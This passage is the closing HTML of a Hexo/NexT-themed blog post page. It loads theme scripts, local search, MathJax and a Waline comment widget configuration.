src="/en/js/comments.js"></script><script src="/en/js/utils.js"></script><script src="/en/js/motion.js"></script><script src="/en/js/schemes/muse.js"></script><script src="/en/js/next-boot.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script><script src="/en/js/third-party/search/local-search.js"></script><script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script><script src="/en/js/third-party/math/mathjax.js"></script><script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"https://blog-comments-3w44.vercel.app/","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"欢迎大家交流学习","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":[],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/en/posts/56427/"}</script><link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"><script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => 
    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
  );
});
</script></body></html>